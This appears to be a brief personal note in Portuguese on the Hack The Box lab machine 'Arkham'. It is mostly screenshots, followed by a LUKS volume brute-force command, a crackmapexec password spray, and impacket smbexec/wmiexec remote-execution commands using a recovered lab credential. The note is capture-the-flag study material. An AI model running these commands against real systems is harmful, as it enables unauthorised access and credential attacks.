Arkham
========================
![qownnotes-media-oqJdew](../../../media/qownnotes-media-oqJdew.png)

![qownnotes-media-YQjqdu](../../../media/qownnotes-media-YQjqdu.png)

![qownnotes-media-QqAsKE](../../../media/qownnotes-media-QqAsKE.png)


![qownnotes-media-JIANno](../../../media/qownnotes-media-JIANno.png)

SMB Enumeration

**ATENÇÃO A ESTE PONTO***

![qownnotes-media-HlFgbt](../../../media/qownnotes-media-HlFgbt.png)



RPC Enumeration

![qownnotes-media-zsCGWR](../../../media/qownnotes-media-zsCGWR.png)

Nikto

Port 8080

![qownnotes-media-kUGUDN](../../../media/qownnotes-media-kUGUDN.png)

Algumas tentativas:

![qownnotes-media-syNLdJ](../../../media/qownnotes-media-syNLdJ.png)


Porta 80 não vale a pena continuar a olhar...


Neste caso sobraram alguns vetores de ataque somente. SMB com o null session e a porta 8080

Alguns testes nessa porta 8080

![qownnotes-media-ixYOFj](../../../media/qownnotes-media-ixYOFj.png)

![qownnotes-media-PwFwQG](../../../media/qownnotes-media-PwFwQG.png)

Retomando quanto ao volume criptografado eu executei um comando aqui para tentar decriptá-lo, porém até então, sem sucesso.


https://github.com/Diverto/cryptsetup-pwguess/releases/tag/v1.0.0

![qownnotes-media-tUcuaE](../../../media/qownnotes-media-tUcuaE.png)

    ./bruteforce-luks-static-linux-amd64 -t 4 -f wordlist_batman_temp.txt backup.img

![qownnotes-media-VlJtTD](../../../media/qownnotes-media-VlJtTD.png)



    crackmapexec smb 10.10.10.130 -u usernames_temp.txt -p passwords_temp.txt
 
 ![qownnotes-media-aTDifR](../../../media/qownnotes-media-aTDifR.png)


    crackmapexec smb 10.10.10.130 -u bruce -p batmanforever --exec-method smbexec -X 'whoami'
    impacket-smbexec 'AKHAM\bruce:batmanforever@10.10.10.130'
    impacket-wmiexec 'AKHAM\bruce:batmanforever@10.10.10.130'
    impacket-wmiexec 'AKHAM\joker@10.10.10.130'
    impacket-smbexec 'bruce:batmanforever@10.10.10.130'
    impacket-wmiexec 'bruce:batmanforever@10.10.10.130'

